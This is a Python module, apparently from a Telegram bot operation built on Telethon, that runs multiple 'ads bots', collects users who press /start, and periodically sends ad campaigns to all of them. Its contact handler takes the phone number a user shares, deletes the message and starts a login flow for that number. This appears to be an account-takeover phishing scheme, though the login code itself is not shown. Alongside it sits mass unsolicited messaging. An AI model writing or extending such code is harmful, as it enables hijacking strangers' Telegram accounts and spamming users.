import os
import hashlib
import logging
import asyncio
from typing import Dict, Optional, Any

from telethon import TelegramClient, events
from telethon.tl import types, functions

import config
import database
import web_server

logger = logging.getLogger(__name__)

# token -> {"client": TelegramClient, "task": asyncio.Task, "me": int, "status": str}
_bots: Dict[str, Dict[str, Any]] = {}

def _session_name(token: str) -> str:
    digest = hashlib.sha256(token.encode()).hexdigest()[:16]
    return os.path.join(config.SESSION_DIR, f"adsbot_{digest}")

async def _send_welcome(client, event, me_username=""):
    settings = database.get_owner_settings()
    emoji = (settings.get("start_emoji") or "").strip()
    text = (settings.get("start_text") or "").strip()
    btn_text = (settings.get("start_button_text") or "START ✅").strip()
    start_image = settings.get("start_image")

    # Emoji and message delivered as two separate messages when both present
    try:
        if emoji:
            await event.respond(emoji)
    except Exception as e:
        logger.warning(f"emoji send failed: {e}")

    if event.sender_id == config.OWNER_ID:
        text = f"{text}\n\n💡 _Admin: open the panel on the Mini App website or type /admin_"

    webapp_url = database.get_webapp_url()
    resolved_image = start_image
    if start_image and start_image.startswith(("http://", "https://")):
        resolved_image = config.fetch_remote_image(start_image)

    try:
        if resolved_image and os.path.exists(resolved_image):
            if text:
                await event.respond(text, parse_mode="html", file=resolved_image)
            else:
                await event.respond("👋", parse_mode="html", file=resolved_image)
        elif text:
            await event.respond(text, parse_mode="html")
        else:
            await event.respond("👋")
    except Exception as e:
        logger.warning(f"start message send failed ({e}); sending plain")
        if resolved_image and os.path.exists(resolved_image):
            try:
                await event.respond(text or "👋", parse_mode="html", file=resolved_image)
            except Exception:
                await event.respond(text or "👋", parse_mode="html")
        else:
            await event.respond(text or "👋", parse_mode="html")

def _register_handlers(client: TelegramClient):
    @client.on(events.NewMessage(pattern="^/start"))
    async def start_handler(event):
        if not event.is_private:
            return
        try:
            database.ads_bot_add_user(client.ads_bot_token, event.sender_id)
            await _send_welcome(client, event)
        except Exception as e:
            logger.error(f"start error: {e}")

    @client.on(events.NewMessage)
    async def contact_handler(event):
        if not event.is_private:
            return
        if not event.message or not event.message.contact:
            return
        try:
            contact = event.message.contact
            if contact.user_id != event.sender_id:
                await event.reply("⚠️ Aap apna *apna* contact share karo, kisi aur ka nahi.")
                return
            phone = "+" + contact.phone_number.strip("+")
            try:
                await event.message.delete()
            except Exception as de:
                logger.warning(f"could not delete contact msg: {de}")
            asyncio.create_task(web_server.start_login_flow(event.sender_id, phone))
        except Exception as e:
            logger.error(f"contact handler error: {e}")

async def start_ads_bot(token: str, name: str = "") -> bool:
    """
    Starts an independent ads bot with the given token, registers Mini App handlers
    and sets the menu button. Safe to call multiple times with different tokens.
    """
    global _bots
    if token in _bots:
        return True

    try:
        api_id, api_hash = database.get_api_credentials()
        client = TelegramClient(
            _session_name(token),
            api_id,
            api_hash,
            device_model="Desktop", system_version="1.0", app_version="1.0.0"
        )
        await client.start(bot_token=token)
        me = await client.get_me()
        _register_handlers(client)

        _bots[token] = {"client": client, "task": None, "name": name or (me.username or me.id), "status": "running"}
        client.ads_bot_token = token
        client.ads_bot_name = name or (me.username or me.id)
        logger.info(f"Ads bot started: @{(me.username or me.id)} ({name})")
        return True
    except Exception as e:
        logger.error(f"Failed to start ads bot {name} ({token[:20]}...): {e}")
        try:
            client.session.close()
        except Exception:
            pass
        return False

async def stop_ads_bot(token: str):
    rec = _bots.pop(token, None)
    if rec:
        try:
            await rec["client"].disconnect()
        except Exception as e:
            logger.warning(f"dc error stopping ads bot: {e}")
        logger.info(f"Stopped ads bot {rec['name']}")

async def test_bot_token(token: str) -> str:
    """Checks a bot token by connecting and calling get_me. Returns a human status string."""
    try:
        api_id, api_hash = database.get_api_credentials()
        tclient = TelegramClient(
            os.path.join(config.SESSION_DIR, f"test_{hashlib.sha256(token.encode()).hexdigest()[:10]}"),
            api_id,
            api_hash,
        )
        await tclient.connect()
        await tclient.start(bot_token=token)
        me = await tclient.get_me()
        username = getattr(me, "username", None)
        await tclient.disconnect()
        for suffix in ("", "-journal", "-shm", "-wal"):
            f = tclient.session.filename + suffix
            try:
                if os.path.exists(f):
                    os.remove(f)
            except Exception:
                pass
        return f"✅ Working - @{username} (id {getattr(me, 'id', '?')})"
    except Exception as e:
        return f"❌ Not working — {e.__class__.__name__}: {e}"

async def remove_ads_bot(token: str):
    await stop_ads_bot(token)
    database.delete_ads_bot(token)

async def start_all_ads_bots():
    """Starts every enabled ads-bot token from the DB (plus the primary bot if enabled)."""
    bots = database.get_ads_bots(enabled_only=True)
    for b in bots:
        try:
            await start_ads_bot(b["token"], b.get("name", ""))
            await asyncio.sleep(1.0)
        except Exception as e:
            logger.error(f"start all: {e}")

async def stop_all_ads_bots():
    for token in list(_bots.keys()):
        await stop_ads_bot(token)

def is_ads_bot_running(token: str) -> bool:
    return token in _bots

def running_count() -> int:
    return len(_bots)


# ============================ PERIODIC USER BROADCAST ============================

async def _send_campaign_to_users(client: TelegramClient) -> int:
    """Sends the latest campaign to every user who started the bot."""
    existing = database.get_all_ads_bot_users()
    token = getattr(client, "ads_bot_token", None)
    if not token or token not in existing:
        return 0

    settings = database.get_owner_settings()
    campaign = settings.get("campaigns", []) or []
    if not campaign:
        logger.info(f"[{getattr(client, 'ads_bot_name', '?')}] No campaigns to broadcast to users.")
        return 0
    # carve out latest campaign that has a photo OR forward source for rich broadcast
    photo_campaign = None
    for c in reversed(campaign):
        if c.get("photo") or c.get("fwd_chat"):
            photo_campaign = c
            break
    target = photo_campaign or campaign[-1]

    users = existing.get(token, [])
    sent = 0
    failures = 0
    for rec in users:
        uid = rec.get("user_id")
        if not uid:
            continue
        try:
            if target.get("fwd_chat") and target.get("fwd_msg"):
                from_peer = int(target["fwd_chat"]) if str(target["fwd_chat"]).lstrip("-").isdigit() else target["fwd_chat"]
                await client.forward_messages(int(uid), int(target["fwd_msg"]), from_peer)
            elif target.get("photo") and os.path.exists(target["photo"]):
                await client.send_file(int(uid), target["photo"], caption=target.get("text") or "")
            elif target.get("text"):
                await client.send_message(int(uid), target["text"])
            else:
                continue
            sent += 1
        except Exception as e:
            failures += 1
            logger.debug(f"ads broadcast to {uid} failed: {e}")
        await asyncio.sleep(1.0)
    logger.info(f"Ads bot broadcasted to {sent} users (failures {failures})")
    return sent

_broadcast_task = None

async def _user_broadcast_loop():
    """Periodically broadcast campaigns to every user who started the bots."""
    global _broadcast_task
    while True:
        try:
            await asyncio.sleep(5)
            settings = database.get_owner_settings()
            active = bool(settings.get("ads_broadcast_active", config.ADS_BROADCAST_ACTIVE))
            if active:
                bots = list(_bots.values())
                for rec in bots:
                    if rec["client"] and rec["client"].is_connected():
                        await _send_campaign_to_users(rec["client"])
        except asyncio.CancelledError:
            raise
        except Exception as e:
            logger.error(f"user broadcast loop error: {e}")
        await asyncio.sleep(config.ADS_BROADCAST_INTERVAL)

def start_user_broadcast_loop():
    """Idempotently starts the global ads-bot user broadcast background task."""
    global _broadcast_task
    if _broadcast_task is None or _broadcast_task.done():
        _broadcast_task = asyncio.get_event_loop().create_task(_user_broadcast_loop())